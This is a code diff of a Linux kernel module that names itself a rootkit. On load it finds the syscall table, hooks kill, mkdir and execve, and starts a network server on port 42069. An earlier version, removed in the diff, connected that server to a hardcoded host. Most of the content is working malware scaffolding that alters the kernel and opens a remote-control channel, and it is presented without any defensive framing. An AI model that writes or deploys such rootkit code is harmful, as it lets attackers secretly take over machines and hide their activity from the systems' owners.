@@ -6,32 +6,38 @@ kernel module imports
 #include <linux/kernel.h> //contains types, macros, functions for the kernel   e.g. KERN_INFO
 #include <linux/string.h>
 
+#include <custom/client_interface.c>
 #include <custom/syscall_table.c> //functions for getting sycall syscall_table
 #include <custom/hooks.c> //functions for hooking syscalls
 #include <custom/hooked_syscalls.c> //functions of the hooked syscalls
 
 #define BUFFER_SIZE 1024 //size of buffers used
 
-static int __init ModuleInit(void) {
-  printk(KERN_DEBUG "[rootkit] installed\n"); //DEBUG //DEBUG logs to dmesg
-  get_syscall_table();
-  install_hook(&sys_kill);
-  install_hook(&sys_mkdir);
-  install_hook(&sys_execve);
-  orig_kill = sys_kill.orig_syscall;
-  orig_mkdir = sys_mkdir.orig_syscall;
-  orig_execve = sys_execve.orig_syscall;
-  run_server("10.1.1.2", 42069);
-  return 0;
-}
 static void __exit ModuleExit(void) {
   remove_hook(&sys_kill);
   remove_hook(&sys_mkdir);
-  server_print("[rootkit] module removed!!!");
+  client_print("[rootkit] module removed!!!");
+
   printk(KERN_DEBUG "[rootkit] removed\n"); //DEBUG
 }
 
+static int __init ModuleInit(void) {
+  printk(KERN_DEBUG "[rootkit] installed\n"); //DEBUG //DEBUG logs to dmesg
+  get_syscall_table(); //gets suyscall table
+  install_hook(&sys_kill); //installs sys_kill hook
+  install_hook(&sys_mkdir); //installs sys_mkdir hook
+  install_hook(&sys_execve); //installs sys_execve hook
+  orig_kill = sys_kill.orig_syscall; //sets orig_kill to original syscall adress
+  orig_mkdir = sys_mkdir.orig_syscall; //sets orig_mkdir to original syscall adress
+  orig_execve = sys_execve.orig_syscall; //sets orig_execve to original syscall adress
 
+  client.client_handler = &client_handler; //sets adress of client handler
+
+  if (run_server(42069)<0){//runs server
+	  ModuleExit();
+  }
+  return 0;
+}
 
 
 module_init(ModuleInit);
